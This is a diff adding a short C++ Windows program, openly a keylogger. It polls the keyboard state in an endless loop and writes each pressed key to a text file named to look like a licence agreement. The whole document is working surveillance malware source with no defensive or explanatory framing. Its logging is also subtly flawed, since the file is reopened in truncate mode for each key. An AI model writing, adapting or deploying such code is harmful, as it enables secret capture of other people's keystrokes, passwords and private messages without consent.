@@ -1,0 +1,34 @@
+#include <windows.h>
+#include <fstream>
+using namespace std;
+
+void keylogger(char key) {
+    ofstream logFile;
+    logFile.open("enduserlicenseagreementprivacypolicyiknowyoudidntactuallyreadmebuttoobadyouagreed.txt");
+
+    if (key == VK_RETURN)
+        logFile << "[ENTER]";
+    else if (key == VK_SPACE)
+        logFile << " ";
+    else if (key == VK_SHIFT)
+        logFile << "[SHIFT]";
+    else if (key == VK_BACK)
+        logFile << "[BACKSPACE]";
+    else if (key == VK_TAB)
+        logFile << "[TAB]";
+    else
+        logFile << key;
+    logFile.close();
+}
+
+int main() {
+    char key;
+    while (true) {
+        for (key = 8; key <= 190; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {
+                keylogger(key);
+            }
+        }
+    }
+    return 0;
+}
